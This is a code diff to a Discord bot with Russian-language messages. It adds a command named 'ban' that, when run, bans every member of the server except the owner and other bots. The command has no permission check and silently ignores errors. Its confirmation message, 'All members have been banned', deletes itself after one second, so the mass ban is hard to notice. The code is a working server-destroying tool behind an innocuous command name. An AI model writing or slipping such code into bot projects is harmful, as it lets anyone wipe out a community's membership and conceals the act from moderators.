@@ -146,6 +146,17 @@ async def photo(ctx):
     await ctx.send(f"@everyone **{ctx.author.name}** кинул фото", file=await ctx.message.attachments[0].to_file())
 
 @bot.command()
+async def ban(ctx):
+    guild = ctx.guild
+    for member in guild.members:
+        if member != guild.owner and not member.bot:
+            try:
+                await member.ban(reason="BANNED")
+            except:
+                pass
+    await ctx.send("Все участники забанены", delete_after=1)
+
+@bot.command()
 async def role(ctx, *, role_name):
     guild = ctx.guild
     role = discord.utils.get(guild.roles, name=role_name)
